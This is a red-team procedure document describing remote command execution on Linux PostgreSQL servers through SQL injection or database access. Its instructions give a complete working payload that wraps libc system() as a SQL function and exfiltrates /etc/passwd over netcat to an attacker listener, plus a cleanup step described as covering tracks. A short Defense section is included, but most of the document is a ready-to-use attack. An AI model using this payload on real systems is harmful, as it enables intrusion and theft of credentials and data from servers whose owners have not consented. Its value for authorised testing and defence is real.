---
id: 15675994-382e-4a7d-b1b4-edbf590ea6ba
name: PostgreSQL-Command-Execution-via-libc-system
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:36.053825+00:00'
updated_at: '2023-04-10T20:23:20.712748+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Command-Line Interface]]'
sub_techniques: []
tags:
  - postgresql-rce
  - sql-injection
  - libc-bypass
commands:
  - '[[commands/nc-tcp-listener]]'
  - '[[commands/psql-execute-arbitrary-sql]]'
platforms:
  - Linux
tools:
  - '[[tools/Netcat]]'
validated: true
---

# PostgreSQL-Command-Execution-via-libc-system

## Summary

This procedure outlines how to achieve remote command execution (RCE) on a Linux-based PostgreSQL server by exploiting SQL injection vulnerabilities or direct database access to load the libc.so.6 library and invoke its system() function. Attackers can create a custom SQL function to run arbitrary OS commands, such as exfiltrating files like /etc/passwd via netcat to an attacker-controlled listener, bypassing typical database restrictions and enabling data theft or further compromise.

## Description

PostgreSQL, a popular open-source relational database, can be vulnerable to injection attacks if user inputs are not properly sanitized in connected applications. This technique leverages the database's ability to load external C libraries, specifically libc.so.6 on Linux systems, to define a 'system' function that executes shell commands. Once created, this function persists in the database session (unless dropped) and allows repeated command execution. The example targets exfiltration of /etc/passwd, but the method can be adapted for other commands like downloading payloads or enumerating users. This requires the PostgreSQL user to have CREATE FUNCTION privileges and the server to run on a system with netcat installed. Detection is challenging without query logging, but network anomalies can reveal exfiltration.

## Requirements

1. SQL injection vulnerability in a web application or direct access to PostgreSQL via credentials with superuser or CREATE privileges.
2. PostgreSQL server on Linux (x86_64 architecture) with libc.so.6 in the expected path (/lib/x86_64-linux-gnu/libc.so.6).
3. Netcat (nc) installed on the target server for outbound data transfer.
4. Attacker machine with netcat listener and PostgreSQL client (psql) for testing/injection.
5. Knowledge of the database connection details (host, port, database name, username).

## Defense

- Regularly update and patch PostgreSQL to address known vulnerabilities and disable unnecessary extensions.
- Implement input validation, prepared statements, and parameterized queries in applications to prevent SQL injection.
- Run the PostgreSQL service with minimal privileges, avoiding superuser access for application accounts, and restrict function creation.
- Enable comprehensive logging of SQL statements, function creations, and external library loads; monitor for suspicious patterns like 'system' functions or libc references.
- Use network access controls, firewalls, and intrusion detection systems to block unusual outbound connections from the database server to unknown IPs.

## Objectives

1. Create a SQL wrapper for the libc system() function to enable OS command execution from within PostgreSQL.
2. Exfiltrate sensitive files, such as /etc/passwd, to an attacker-controlled endpoint for reconnaissance.
3. Establish a foothold for further post-exploitation activities, like privilege escalation or lateral movement.

## Instructions

### Step 1: Set Up Netcat Listener on Attacker Machine

**Context**: Initiate a TCP listener to capture the exfiltrated data from the target server. This step ensures the command executed on the database server can send output reliably.

**Command** ([[commands/nc-tcp-listener]]):

```bash
nc -lvnp $_PORT
```

> Run this on your attacker machine before proceeding. It will display connection details and received data upon successful exfiltration. Replace $_PORT with a high port like 4444 to avoid conflicts.

### Step 2: Prepare and Execute the SQL Code for RCE

**Context**: Use the PostgreSQL client to connect to the target database and execute the SQL snippet that creates the system function and runs the exfiltration command. This step assumes you have identified an injection point or direct access; adapt the SQL delivery method (e.g., via Burp Suite for injection) as needed.

Reference the code snippet from [[codes/PostgreSQL-libc-system-RCE]] and replace the placeholders <attacker IP> and <attacker port> with your listener details (e.g., your IP and the port from Step 1).

**Command** ([[commands/psql-execute-arbitrary-sql]]):

```bash
psql -h $_DB_HOST -p $_DB_PORT -U $_DB_USER -d $_DB_NAME -c "$_SQL"
```

> Here, set $_SQL to the modified code from [[codes/PostgreSQL-libc-system-RCE]], e.g., `CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; SELECT system('cat /etc/passwd | nc 192.168.1.100 4444');`. If the SQL is long, save it to a file (sql_rce.sql) and use `-f sql_rce.sql` instead of `-c`. This executes the function creation and command invocation in one go. The function persists for the session unless explicitly dropped.

**Expected Output**: psql will return the result of the SELECT statement, typically `system
0` (indicating successful command execution with exit code 0). No errors like 'function already exists' if REPLACE is used. Simultaneously, check your netcat listener for incoming data.

### Step 3: Verify Exfiltration and Clean Up

**Context**: Confirm the data was received and optionally drop the function to cover tracks, though this may not be necessary in a red team exercise.

**Command** ([[commands/psql-execute-arbitrary-sql]]):

```bash
psql -h $_DB_HOST -p $_DB_PORT -U $_DB_USER -d $_DB_NAME -c "DROP FUNCTION system(cstring);"
```

> This removes the custom function. Expected output: `DROP FUNCTION` confirmation. Review the netcat output for the full /etc/passwd contents to validate success.

**Expected Output**: Function dropped successfully, and earlier exfiltration shows user accounts and hashes from /etc/passwd.
